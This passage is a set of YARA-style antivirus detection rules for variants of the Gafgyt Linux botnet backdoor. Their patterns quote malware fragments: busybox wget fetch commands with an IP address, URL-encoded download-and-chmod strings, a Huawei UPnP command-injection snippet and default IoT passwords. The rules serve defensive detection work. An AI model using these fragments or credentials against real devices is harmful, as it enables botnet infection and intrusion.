{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BB!xp"
        threat_id = "2147817556"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "rm -rf Cheats*" ascii //weight: 1
        $x_1_2 = "cd /root" ascii //weight: 1
        $x_1_3 = "MojeekBot/2.0" ascii //weight: 1
        $x_1_4 = "/etc/resolv.conf" ascii //weight: 1
        $x_1_5 = "npxXoudifFeEgGaACScs" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Gafgyt_BC_2147817831_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BC!xp"
        threat_id = "2147817831"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/dev/netslink/" ascii //weight: 1
        $x_1_2 = "WWau14TJ8IapVXrrlFq0q5sxB" ascii //weight: 1
        $x_1_3 = "busybox wget" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_BA_2147817853_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BA!xp"
        threat_id = "2147817853"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "dreambox" ascii //weight: 2
        $x_2_2 = "xmhdipc" ascii //weight: 2
        $x_1_3 = "admin1234" ascii //weight: 1
        $x_1_4 = "klv123" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_BG_2147817855_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BG!xp"
        threat_id = "2147817855"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "/usr/sbin/dropbear" ascii //weight: 2
        $x_2_2 = "KILLATTK" ascii //weight: 2
        $x_2_3 = "LOLNOGTFO" ascii //weight: 2
        $x_2_4 = "BOTKILL" ascii //weight: 2
        $x_1_5 = "BOGOMIPS" ascii //weight: 1
        $x_1_6 = "hlLjztqZ" ascii //weight: 1
        $x_1_7 = "npxXoudifFeEgGaACScs" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 3 of ($x_1_*))) or
            ((2 of ($x_2_*) and 1 of ($x_1_*))) or
            ((3 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Gafgyt_F_2147818207_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.F"
        threat_id = "2147818207"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Boatnet" ascii //weight: 1
        $x_1_2 = "self rep netis and nrpe got" ascii //weight: 1
        $x_2_3 = "80.211.75.35" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_F_2147818207_1
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.F"
        threat_id = "2147818207"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "huawei_kill" ascii //weight: 1
        $x_1_2 = "<NewStatusURL>$(/bin/busybox wget -g" ascii //weight: 1
        $x_1_3 = "<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>" ascii //weight: 1
        $x_1_4 = {31 c0 ff c0 80 75 00 ?? 48 ff c5 41 39 c4 75 f2}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_G_2147818208_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.G"
        threat_id = "2147818208"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "[0m PASSWORD SENT --> [%s:23|%s]" ascii //weight: 1
        $x_1_2 = "[0m USERNAME SENT --> [%s:23|%s]" ascii //weight: 1
        $x_1_3 = "[0m DEVICE FOUND --> [%s:23" ascii //weight: 1
        $x_1_4 = "Cock pulled out and awaiting orders" ascii //weight: 1
        $x_1_5 = "[0m Dicksize: %s." ascii //weight: 1
        $x_1_6 = "UDP Flood From Qbot" ascii //weight: 1
        $x_1_7 = "[0m Wtf is this shit: %s" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule Backdoor_Linux_Gafgyt_F_2147818247_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.F!MTB"
        threat_id = "2147818247"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "hoho botnet" ascii //weight: 1
        $x_1_2 = "./.akame" ascii //weight: 1
        $x_1_3 = "akamebotnet" ascii //weight: 1
        $x_1_4 = "spoofed" ascii //weight: 1
        $x_1_5 = "bins/akame." ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_BD_2147818273_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BD!xp"
        threat_id = "2147818273"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_3_1 = "WAR3.91WAR" ascii //weight: 3
        $x_2_2 = "wget http://89.34.97.115" ascii //weight: 2
        $x_1_3 = "hlLjztqZ" ascii //weight: 1
        $x_1_4 = "UDPFLOOD" ascii //weight: 1
        $x_1_5 = "KILLATT" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 3 of ($x_1_*))) or
            ((1 of ($x_3_*) and 2 of ($x_1_*))) or
            ((1 of ($x_3_*) and 1 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Gafgyt_BF_2147818274_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BF!xp"
        threat_id = "2147818274"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "/etc/dropbear/" ascii //weight: 2
        $x_2_2 = "bOaTnEt system" ascii //weight: 2
        $x_1_3 = "npxXoudifFeEgGaACScs" ascii //weight: 1
        $x_1_4 = "hlLjztqZ" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Gafgyt_BH_2147818275_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BH!xp"
        threat_id = "2147818275"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {63 75 72 6c 20 2d 4f 20 68 74 74 70 3a 2f 2f [0-32] 2f 73 68 61 6b 65 72}  //weight: 1, accuracy: Low
        $x_1_2 = "history -c" ascii //weight: 1
        $x_1_3 = "rm -rf shaker" ascii //weight: 1
        $x_1_4 = "chmod +x shaker" ascii //weight: 1
        $x_1_5 = "npxXoudifFeEgGaACScs" ascii //weight: 1
        $x_1_6 = "hlLjztqZ" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule Backdoor_Linux_Gafgyt_BI_2147818276_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BI!xp"
        threat_id = "2147818276"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/bin/busybox" ascii //weight: 1
        $x_1_2 = "-loldongs" ascii //weight: 1
        $x_1_3 = "SERVZUXO" ascii //weight: 1
        $x_1_4 = {78 34 37 72 6f 75 70 73 3a 09 30}  //weight: 1, accuracy: High
        $x_1_5 = "/dev/null" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Gafgyt_G_2147818377_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.G!MTB"
        threat_id = "2147818377"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "mExploiting" ascii //weight: 1
        $x_1_2 = "npxXoudifFeEgGaACScs" ascii //weight: 1
        $x_1_3 = "mDemon" ascii //weight: 1
        $x_1_4 = "/proc/cpuinfo" ascii //weight: 1
        $x_1_5 = "hlLjztqZ" ascii //weight: 1
        $x_1_6 = "/etc/xinet.d" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Gafgyt_H_2147818406_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.H"
        threat_id = "2147818406"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "killed pid: (%s)" ascii //weight: 1
        $x_1_2 = "<=>?@ABCDEFGJIMOPQRSTUVWX[\\^_`abcxyz{|}" ascii //weight: 1
        $x_2_3 = "$UICIDEBOY$" ascii //weight: 2
        $x_1_4 = "botnet" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Gafgyt_BK_2147818448_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BK!MTB"
        threat_id = "2147818448"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_2_1 = {8b 45 e0 c1 e0 02 03 45 e0 01 c0 89 45 e0 8b 45 0c 0f b6 00 0f b6 c0 03 45 e0 83 e8 30 89 45 e0 ff 45 0c 8b 45 0c 0f b6 00 3c 2f 76 0a 8b 45 0c 0f b6 00 3c 39}  //weight: 2, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_BI_2147818541_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BI!MTB"
        threat_id = "2147818541"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8b 45 0c 8a 00 25 ff 00 00 00 83 ec 08 50 ff 75 08 e8 [0-5] 83 c4 10 ff 45 f0 ff 45 0c 8b 45 0c 8a 00 84 c0}  //weight: 1, accuracy: Low
        $x_1_2 = {83 ec 08 ff 75 f4 ff 75 08 e8 [0-5] 83 c4 10 ff 45 f0 ff 4d 10 83 7d 10 00 7f [0-3] 8b 45 f0 c9 c3}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_BL_2147818564_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BL!MTB"
        threat_id = "2147818564"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "rawudp" ascii //weight: 1
        $x_1_2 = "killattk" ascii //weight: 1
        $x_1_3 = "botkill" ascii //weight: 1
        $x_1_4 = "oUzilSz14xd2m0LhSdY1TP3UrQZJnthLumEUSgK2yuqBDBlcSg3WggUefEnRTK" ascii //weight: 1
        $x_1_5 = "hlLjztqZ" ascii //weight: 1
        $x_1_6 = "npxXoudifFeEgGaACScs" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_BE_2147818619_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BE!xp"
        threat_id = "2147818619"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "killdabot" ascii //weight: 2
        $x_2_2 = "botkill" ascii //weight: 2
        $x_1_3 = "bot -udp" ascii //weight: 1
        $x_1_4 = "scanner" ascii //weight: 1
        $x_1_5 = "bot -tcp" ascii //weight: 1
        $x_1_6 = "Killing pid" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 3 of ($x_1_*))) or
            ((2 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Gafgyt_BE_2147818619_1
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BE!xp"
        threat_id = "2147818619"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "rf%20curl.sh%3B" ascii //weight: 1
        $x_1_2 = "npxXoudifFeEgGaACScs" ascii //weight: 1
        $x_1_3 = "Multihop attempted" ascii //weight: 1
        $x_1_4 = "Acid malware" ascii //weight: 1
        $x_1_5 = "wget.sh%3Bchmod%20%2Bx%20wget.sh" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_BJ_2147818620_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BJ!xp"
        threat_id = "2147818620"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "WAR3.91WAR" ascii //weight: 2
        $x_1_2 = "HOLD" ascii //weight: 1
        $x_1_3 = "BOGOMIPS" ascii //weight: 1
        $x_2_4 = "KILLAT" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Gafgyt_BM_2147818621_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BM!xp"
        threat_id = "2147818621"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "spooked" ascii //weight: 2
        $x_2_2 = "qweebotkiller" ascii //weight: 2
        $x_1_3 = "sniffsniff" ascii //weight: 1
        $x_1_4 = "spooky-machine" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Gafgyt_BK_2147818622_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BK!xp"
        threat_id = "2147818622"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "bumbox" ascii //weight: 2
        $x_1_2 = "DDOSJUNKFLOOD" ascii //weight: 1
        $x_1_3 = "npxXdifFeEgGa" ascii //weight: 1
        $x_2_4 = "KILLAT" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Gafgyt_BN_2147818627_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BN!xp"
        threat_id = "2147818627"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {68 74 74 70 3a [0-40] 2f 66 79 66 61 2e 73 68}  //weight: 2, accuracy: Low
        $x_1_2 = "/usr/sbins/dropbear" ascii //weight: 1
        $x_1_3 = "RMBUSY" ascii //weight: 1
        $x_1_4 = "BusyBox" ascii //weight: 1
        $x_1_5 = "npxXoudifFeEgGaACScs" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 3 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Gafgyt_J_2147818960_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.J!MTB"
        threat_id = "2147818960"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "HTTPSTOMP" ascii //weight: 1
        $x_1_2 = "OVHKILL" ascii //weight: 1
        $x_1_3 = "CFBYPASS" ascii //weight: 1
        $x_1_4 = "NFOKILL" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Gafgyt_BO_2147819148_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BO!xp"
        threat_id = "2147819148"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {00 01 44 30 00 01 45 ac 00 01 48 b8 9d e3 bf 90 f0 27 a0 44 03 00 00 d1 84 10}  //weight: 1, accuracy: High
        $x_1_2 = {bc 10 00 00 9c 23 a0 18 d2 03 a0 58 94 03 a0 5c 11 00 00 5b}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_BS_2147819149_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BS!xp"
        threat_id = "2147819149"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {a0 00 0b e5 a4 10 0b e5 a8 20 0b e5 ac 30 0b e5 00 30 a0 e3 9c 30 0b e5 a4 30 1b e5 98 30 0b e5 94 30 4b e2 10 30 0b e5 00 30 a0 e3 14 30 0b e5 06 00 00}  //weight: 1, accuracy: High
        $x_1_2 = {30 9f e5 00 10 93 e5 20 20 1b e5 24 30 1b e5 02}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_BT_2147819151_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BT!xp"
        threat_id = "2147819151"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {88 50 8f 4a 80 67 08 70 01 2d 40 ff f4 60 04 42 ae ff f4 2d 6e ff f4 ff}  //weight: 1, accuracy: High
        $x_1_2 = {00 0c 20 80 20 6e 00 0c 20 10 72 ff b2 80 66 08 70 01 2d 40 ff f8 60 04 42 ae}  //weight: 1, accuracy: High
        $x_1_3 = {f0 24 6e ff f4 4e 5e 4e 75 4e 56 ff 50 2f 02 22 2e 00 10 20 2e 00 0c 20 40 20 01}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule Backdoor_Linux_Gafgyt_BV_2147819251_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BV!xp"
        threat_id = "2147819251"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {89 45 fc 8b 45 fc 89 45 d4 83 7d d4 ff 74 0b 83 7d d4 00}  //weight: 1, accuracy: High
        $x_1_2 = {8b 04 85 e0 4a 51 00 31 c2 8b 45 fc 31 d0 89 c2 81 f2 b9 79 37 9e 48 63 c1 89 14 85 e0 4a 51 00}  //weight: 1, accuracy: High
        $x_1_3 = {48 8b 55 d8 0f b6 02 3c 72 75 10 8b 45 f0 89 45 e4 8b 7d f4}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule Backdoor_Linux_Gafgyt_BY_2147819253_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BY!xp"
        threat_id = "2147819253"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {30 c2 e5 10 30 1b e5 00 30 93 e5 01 20 83 e2 10 30 1b e5 00 20 83 e5 04 00 00}  //weight: 1, accuracy: High
        $x_1_2 = {30 1b e5 00 00 53 e3 0a 00 00 0a 28 30 1b e5 0a 00 53 e3 07}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_BW_2147819268_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BW!xp"
        threat_id = "2147819268"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sarugami" ascii //weight: 1
        $x_1_2 = "botkill" ascii //weight: 1
        $x_1_3 = {75 64 70 00 2f 64 65 76 2f 6e 75 6c 6c}  //weight: 1, accuracy: Low
        $x_1_4 = "PONG" ascii //weight: 1
        $x_1_5 = "PING" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Gafgyt_BX_2147819269_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BX!xp"
        threat_id = "2147819269"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "FN-LAG" ascii //weight: 1
        $x_1_2 = "LIGHTS-OUT" ascii //weight: 1
        $x_1_3 = "hlLjztqZ" ascii //weight: 1
        $x_1_4 = "npxXoudifFeEgGaACScs" ascii //weight: 1
        $x_1_5 = "OVH-KILLER" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Gafgyt_BQ_2147819319_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BQ!MTB"
        threat_id = "2147819319"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {bd 27 2c 00 bf af 28 00 be af 21 f0 a0 03 10 00 bc af 30 00 c4 af 1c 00 c0 af 30 00 c4 8f 64 81 99 ?? ?? ?? ?? 00 09 f8 20 03 00}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_BP_2147819321_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BP!MTB"
        threat_id = "2147819321"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = {c2 07 a0 48 c2 08 40 00 82 08 60 ff 80 a0 60 64 [0-16] c4 07 a0 4c 82 10 00 02 c6 00 40 00 82 00 a0 04 c2 27 a0 4c 82 10 20 61 c2 23 a0 5c d0 07 a0 44 92 10 00 03 94 10 20 0a 96 10 20 01 d8 07 bf e0 da 07 bf e4}  //weight: 3, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_BV_2147819322_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BV!MTB"
        threat_id = "2147819322"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {81 3f 00 0c 38 09 00 01 90 1f 00 0c 80 1f 00 0c 7c 09 03 78 80 1f 00 18 7d 29 02 14 88 09 00 00 54 00 06 3e 7c 03 03 78 4c c6 31 82 48 [0-5] 7c 60 1b 78 2f 80}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_K_2147819323_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.K!MTB"
        threat_id = "2147819323"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "UDPFLOOD" ascii //weight: 1
        $x_1_2 = "STOPATT" ascii //weight: 1
        $x_1_3 = "hlLjztq" ascii //weight: 1
        $x_1_4 = "KILLATTK" ascii //weight: 1
        $x_1_5 = "PROT_EXEC" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Gafgyt_P_2147819324_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.P!MTB"
        threat_id = "2147819324"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
